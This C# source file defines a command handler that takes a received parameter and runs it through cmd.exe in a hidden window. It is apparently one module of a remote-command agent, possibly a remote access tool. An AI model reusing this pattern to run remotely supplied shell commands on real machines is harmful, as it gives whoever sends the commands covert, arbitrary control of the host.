using Barsa.Abstracts;
using Barsa.Commons;
using Barsa.Models.Enums;
using Barsa.Models.Errors;
using System;
using System.Collections.Generic;
using System.Diagnostics;

namespace Caronte.Modules.Command.ReceiveCommand.Commands
{
    public class CMD : AbstractHandler
    {
        public override CommonResponse Handle(CommandType commandType, object param)
        {
            CommonResponse response = new();

            if (commandType != CommandType.CMD)
                return base.Handle(commandType, param);

            try
            {
                var processStartInfo = new ProcessStartInfo("cmd.exe", $"/C {Convert.ToString(param)}");
                
                processStartInfo.RedirectStandardOutput = true;
                processStartInfo.UseShellExecute = false;
                processStartInfo.CreateNoWindow = true;

                using (var processo = new Process())
                {
                    processo.StartInfo = processStartInfo;
                    processo.Start();
                }
            }
            catch (Exception ex)
            {
                response.AddErrors(new Errors(ErrorType.Unspecified, ex?.Message, new List<Exception>() { ex }));
            }

            return response;
        }

    }
}
